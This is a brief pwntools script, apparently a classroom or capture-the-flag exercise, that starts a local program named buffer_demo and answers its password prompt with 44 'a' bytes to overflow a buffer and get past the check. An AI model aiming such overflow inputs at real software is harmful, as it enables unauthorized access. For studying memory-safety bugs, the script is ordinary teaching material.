from pwn import *

pty = process.PTY

p = process("./buffer_demo", stdin=pty, stdout=pty)

#p.sendlineafter(b"nter your password: ", b"secretpassword123")

p.sendlineafter(b"password: ", b"a" * 44)

p.interactive()